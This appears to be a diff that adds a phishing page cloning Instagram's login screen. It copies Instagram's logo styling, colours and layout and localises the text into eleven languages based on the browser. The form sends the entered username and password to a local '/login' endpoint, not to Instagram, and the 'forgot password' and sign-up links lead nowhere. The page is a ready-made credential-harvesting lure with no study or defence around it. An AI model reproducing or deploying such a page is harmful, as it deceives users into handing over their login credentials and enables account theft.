@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;
+width:350px;text-align:center}
+.logo{font-family:'Billabong',cursive,serif;font-size:2.8rem;margin-bottom:20px;
+background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
+-webkit-background-clip:text;-webkit-text-fill-color:transparent;
+background-clip:text;font-weight:400}
+.sep{display:flex;align-items:center;margin:16px 0;gap:16px}
+.sep .line{flex:1;height:1px;background:#dbdbdb}
+.sep span{color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
+input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;
+border-radius:3px;font-size:12px;margin-bottom:6px;outline:none;color:#262626}
+input:focus{border-color:#a8a8a8}
+.btn{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;
+border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn:hover{background:#1877f2}
+.forgot{display:block;margin-top:14px;color:#00376b;font-size:12px;text-decoration:none}
+.signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:16px;
+width:350px;text-align:center;margin-top:10px;font-size:14px;color:#262626}
+.signup a{color:#0095f6;font-weight:600;text-decoration:none}
+.get{text-align:center;margin-top:16px;font-size:14px;color:#262626}
+.badges{display:flex;justify-content:center;gap:8px;margin-top:12px}
+</style>
+</head>
+<body>
+<div>
+<div class="card">
+<div class="logo">Instagram</div>
+<form method="POST" action="/login">
+<input type="text" name="username" data-i18n-ph="user_ph" placeholder="Phone number, username or email" required autocomplete="off">
+<input type="password" name="password" data-i18n-ph="pass_ph" placeholder="Password" required>
+<button type="submit" class="btn" data-i18n="login">Log in</button>
+</form>
+<div class="sep"><div class="line"></div><span data-i18n="or">OR</span><div class="line"></div></div>
+<a href="#" class="forgot" data-i18n="forgot">Forgotten your password?</a>
+</div>
+<div class="signup"><span data-i18n="no_account">Don't have an account?</span> <a href="#" data-i18n="signup">Sign up</a></div>
+<div class="get" data-i18n="get_app">Get the app.</div>
+</div>
+<script>
+(function(){
+var T={
+en:{user_ph:"Phone number, username or email",pass_ph:"Password",login:"Log in",or:"OR",forgot:"Forgotten your password?",no_account:"Don't have an account?",signup:"Sign up",get_app:"Get the app."},
+pt:{user_ph:"Telefone, nome de usu\u00e1rio ou email",pass_ph:"Senha",login:"Entrar",or:"OU",forgot:"Esqueceu a senha?",no_account:"N\u00e3o tem uma conta?",signup:"Cadastre-se",get_app:"Baixe o aplicativo."},
+es:{user_ph:"Tel\u00e9fono, usuario o correo",pass_ph:"Contrase\u00f1a",login:"Iniciar sesi\u00f3n",or:"O",forgot:"\u00bfOlvidaste tu contrase\u00f1a?",no_account:"\u00bfNo tienes una cuenta?",signup:"Reg\u00edstrate",get_app:"Descarga la app."},
+fr:{user_ph:"T\u00e9l\u00e9phone, nom d'utilisateur ou e-mail",pass_ph:"Mot de passe",login:"Se connecter",or:"OU",forgot:"Mot de passe oubli\u00e9 ?",no_account:"Vous n'avez pas de compte ?",signup:"Inscrivez-vous",get_app:"T\u00e9l\u00e9chargez l'app."},
+de:{user_ph:"Telefonnummer, Benutzername oder E-Mail",pass_ph:"Passwort",login:"Anmelden",or:"ODER",forgot:"Passwort vergessen?",no_account:"Noch kein Konto?",signup:"Registrieren",get_app:"Hol dir die App."},
+it:{user_ph:"Telefono, nome utente o email",pass_ph:"Password",login:"Accedi",or:"OPPURE",forgot:"Password dimenticata?",no_account:"Non hai un account?",signup:"Iscriviti",get_app:"Scarica l'app."},
+ja:{user_ph:"\u96fb\u8a71\u756a\u53f7\u3001\u30e6\u30fc\u30b6\u30fc\u30cd\u30fc\u30e0\u3001\u30e1\u30fc\u30eb",pass_ph:"\u30d1\u30b9\u30ef\u30fc\u30c9",login:"\u30ed\u30b0\u30a4\u30f3",or:"\u307e\u305f\u306f",forgot:"\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u5fd8\u308c\u305f\u5834\u5408",no_account:"\u30a2\u30ab\u30a6\u30f3\u30c8\u304c\u306a\u3044\u5834\u5408\u306f",signup:"\u767b\u9332",get_app:"\u30a2\u30d7\u30ea\u3092\u5165\u624b"},
+zh:{user_ph:"\u624b\u673a\u53f7\u3001\u7528\u6237\u540d\u6216\u90ae\u7bb1",pass_ph:"\u5bc6\u7801",login:"\u767b\u5f55",or:"\u6216",forgot:"\u5fd8\u8bb0\u5bc6\u7801\uff1f",no_account:"\u6ca1\u6709\u8d26\u6237\uff1f",signup:"\u6ce8\u518c",get_app:"\u4e0b\u8f7d\u5e94\u7528"},
+ko:{user_ph:"\uc804\ud654\ubc88\ud638, \uc0ac\uc6a9\uc790 \uc774\ub984 \ub610\ub294 \uc774\uba54\uc77c",pass_ph:"\ube44\ubc00\ubc88\ud638",login:"\ub85c\uadf8\uc778",or:"\ub610\ub294",forgot:"\ube44\ubc00\ubc88\ud638\ub97c \uc788\uc73c\uc168\ub098\uc694?",no_account:"\uacc4\uc815\uc774 \uc5c6\uc73c\uc2e0\uac00\uc694?",signup:"\uac00\uc785\ud558\uae30",get_app:"\uc571\uc744 \ub2e4\uc6b4\ub85c\ub4dc\ud558\uc138\uc694."},
+ru:{user_ph:"\u0422\u0435\u043b\u0435\u0444\u043e\u043d, \u0438\u043c\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0438\u043b\u0438 \u044d\u043b. \u0430\u0434\u0440\u0435\u0441",pass_ph:"\u041f\u0430\u0440\u043e\u043b\u044c",login:"\u0412\u043e\u0439\u0442\u0438",or:"\u0418\u041b\u0418",forgot:"\u0417\u0430\u0431\u044b\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c?",no_account:"\u041d\u0435\u0442 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430?",signup:"\u0417\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0439\u0442\u0435\u0441\u044c",get_app:"\u0421\u043a\u0430\u0447\u0430\u0439\u0442\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435."},
+ar:{user_ph:"\u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641 \u0623\u0648 \u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0623\u0648 \u0627\u0644\u0628\u0631\u064a\u062f",pass_ph:"\u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",login:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644",or:"\u0623\u0648",forgot:"\u0647\u0644 \u0646\u0633\u064a\u062a \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631\u061f",no_account:"\u0644\u064a\u0633 \u0644\u062f\u064a\u0643 \u062d\u0633\u0627\u0628\u061f",signup:"\u0633\u062c\u0651\u0644",get_app:"\u062d\u0645\u0651\u0644 \u0627\u0644\u062a\u0637\u0628\u064a\u0642."}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+document.querySelectorAll('[data-i18n-ph]').forEach(function(e){var k=e.getAttribute('data-i18n-ph');if(t[k])e.placeholder=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
